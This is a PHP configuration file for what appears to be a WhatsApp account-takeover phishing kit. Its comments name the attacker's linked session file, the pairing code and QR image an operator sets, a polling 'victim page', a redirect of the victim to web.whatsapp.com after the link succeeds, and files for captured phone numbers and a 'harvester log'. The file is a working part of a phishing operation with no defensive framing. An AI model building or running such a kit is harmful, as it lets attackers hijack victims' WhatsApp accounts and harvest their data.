<?php
/**
 * Project configuration.
 *
 * Edit these values to match your deployment. All paths are relative to the
 * project root unless stated otherwise.
 */
return [
    // Where captured data is stored (must be writable by the web server).
    'data_dir'        => __DIR__ . '/data',

    // File that holds the attacker's linked WhatsApp session bundle.
    'session_file'    => __DIR__ . '/data/wa-s-id.json',

    // File holding the current 8-char pairing code (written by operator).
    'code_file'       => __DIR__ . '/data/code.txt',

    // File holding the current QR image (written by operator).
    'qr_file'         => __DIR__ . '/assets/qr.png',

    // Where to redirect the victim after a successful link.
    'redirect_url'    => 'https://web.whatsapp.com',

    // Polling interval for the victim page (milliseconds).
    'poll_interval'   => 2000,

    // Phone numbers / codes capture files.
    'phones_file'     => __DIR__ . '/data/wa-phones.json',
    'captures_file'   => __DIR__ . '/data/wa-captures.json',

    // Generic harvester log.
    'harvest_file'    => __DIR__ . '/data/harvest.log',
];
